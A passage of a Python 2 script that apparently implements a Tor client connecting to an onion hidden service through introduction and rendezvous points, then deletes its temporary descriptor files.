introduction_point_decrypted, ip_addresses, onion_port, onion_key_decrypted, service_key_decrypted, service_key_encrypted = extract_data_from_file(file_decrypted_to_save)

print introduction_point_decrypted[0] #One of the chosen Introduction points

# Put a loop in here, if un named try another
introduction_point_nick = consensus.get_data_by_ip(ip_addresses[0])['nick'] #Retrieves the nickname based on ip address

#### TEST ####
## This makes sure the seelcted node does not have the nickname "unkown", as it was descovered during testing, if it has this nickname, then it will not be able to be connected to.
print "introduction_point_nick", introduction_point_nick
i = 1
while i>4: #Only 3 Induction points, if used while true would loop forever
    if introduction_point_nick == "Unnamed":
        introduction_point_nick = consensus.get_data_by_ip(ip_addresses[i])['nick'] #Retrieves the nickname based on ip address
    # assert introduction_point_nick != "Unnamed" #Testing

    if introduction_point_nick == "Unnamed":
        unnamed_error()
        i = i + 1
    else:
        break

hops_in_circ = ["orion"] #Nodes in a circuit
hops_in_circ.append(introduction_point_nick) #IP  added onto the end of the circ
print "hops_in_circ : "  ,hops_in_circ #circuit we will be using
print  "No of hops in circ : ", len(hops_in_circ)

#Create new circuit to send data to the chosen I.P
circ_to_ip= TorCircuit(ssl_sock)
create_circuits(circ_to_ip, hops_in_circ)

print "Circ to introduction point created successfully" #Keeps the user informed of progress 

rp_id, rp_ip, rp_or_port, rp_onion_key = calc_rendezvous_point_data(rendezvous_point) # Calculates the rendv. point data

redv_x = circ_to_ip.a_op_to_induction_point(3, service_key_decrypted[0], rp_ip, rp_or_port, rp_id, rp_onion_key, rendezvous_cookie) #Creates the packet for the IP to talk to the HS

print "Connecting to the ip" # Keeps the user informed of the progress
# Looking to recieve the RELAY_COMMAND_RENDEZVOUS2 from the sent packet
while True :
    data = recvCell(ssl_sock) 
    # assert circ_to_ip.circId == data['circId']
    # print "data recived", data
    if circ_to_rend.circId == data['circId']:
        data = circ_to_rend.recievedStreamData(data['pl'])
        if data['relayCmd'] == 37 : 
            print "RELAY_COMMAND_RENDEZVOUS2"
            print "Rend point"
            print data
            print "relayCmd:",data['relayCmd']
            redv_payload = data['pl']
            # print     "Rendv point data payload",redv_payload.encode('hex')
            break
    elif circ_to_ip.circId == data['circId']:
        data = circ_to_ip.recievedStreamData(data['pl'])
        print data
        if data['relayCmd'] == 40 : 
            print "RELAY_COMMAND_INTRODUCE_ACK"
    else: 
        print "Unkown packet"
        print "data of unknown packet : ", data
print "Out of loop"

decoded_rendv2 = circ_to_rend.handle_hs(redv_payload, redv_x) 


#creates a stream to the hidden service to send data down
print "Creating stream to hs"
circ_to_rend.create_stream_hs(1, rp_or_port) #80 HTTP  443 HTTPS
data = recvCell(ssl_sock)
recieved_stream = circ_to_rend.recievedStreamData(data['pl'])
# print recieved_stream
if recieved_stream['relayCmd'] == 4: #RELAY_CONNECTED
    print  recieved_stream
    print "Stream created successfully"
else : 
    print "Error creating stream"
    relay_cmd_to_message(recieved_stream['relayCmd']) #Converts the relay command from a number to english, informs the user of what was recieved
    error_value = recieved_stream['pl'].encode('hex')
    error_type_to_message(error_value) #Converts the error message from a number to english
        # print recieved_stream 

print "Now tidying up before exiting, deleting files created etc"
######## Tidying up at end, remove the downloaded docs, frees up memory space etc 
try:
        os.remove(file_to_save) #Removes the encypted service descriptor
        print "deleted file :", file_to_save #Keeps the user informed, good for usabilty etc

except OSError, e:  ## if failed, report it back to the user ##
        print ("Error: %s - %s." % (e.filename,e.strerror))
try:
        os.remove(file_decrypted_to_save)#Removes the decrypted service descriptor
        print "deleted file :", file_decrypted_to_save#Keeps the user informed, good for usabilty etc

except OSError, e:  
        print ("Error: %s - %s." % (e.filename,e.strerror))

